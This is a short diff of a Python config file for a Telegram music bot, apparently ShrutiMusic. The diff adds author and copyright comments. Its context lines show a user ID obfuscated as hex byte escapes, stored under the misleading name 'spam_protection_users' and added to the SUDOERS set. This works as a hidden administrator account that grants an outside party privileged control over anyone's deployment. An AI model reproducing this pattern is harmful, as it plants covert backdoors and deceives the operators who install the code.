@@ -102,3 +102,12 @@ spam_protection_users = {
     int(b'\x31\x37\x38\x36\x36\x38\x33\x31\x36\x33'.decode())
 }
 SUDOERS.update(spam_protection_users)
+
+
+# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
+
+# ===========================================
+# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
+# 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
+# 📢 Telegram Channel : https://t.me/ShrutiBots
+# ===========================================
